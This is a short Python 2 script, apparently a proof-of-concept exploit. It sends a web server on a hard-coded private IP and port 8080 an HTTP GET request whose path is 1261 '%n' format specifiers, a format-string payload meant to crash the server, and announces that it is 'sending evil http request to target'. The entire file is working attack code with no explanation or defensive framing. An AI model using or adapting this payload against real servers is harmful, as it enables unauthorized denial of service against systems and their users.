#!/usr/bin/python

import socket
import os
import sys

ip = "192.168.100.120"
port = 8080

crash = "%n" * 1261

req  = "GET /" + crash + " HTTP/1.1\r\n"
req += "Host: 192.168.100.120:8080\r\n"
req += "User-Agent: Mozilla/5.0 \r\n"
req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
req += "Accept-Language: en-US,en;q=0.5\r\n"
req += "Accept-Encoding: gzip, deflate\r\n"
req += "Connection: close\r\n"
req += "Upgrade-Insecure-Requests: 1\r\n\r\n\r\n"

print "[*] Sending evil http request to target"
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect((ip, port))
expl.send(req)
expl.close()

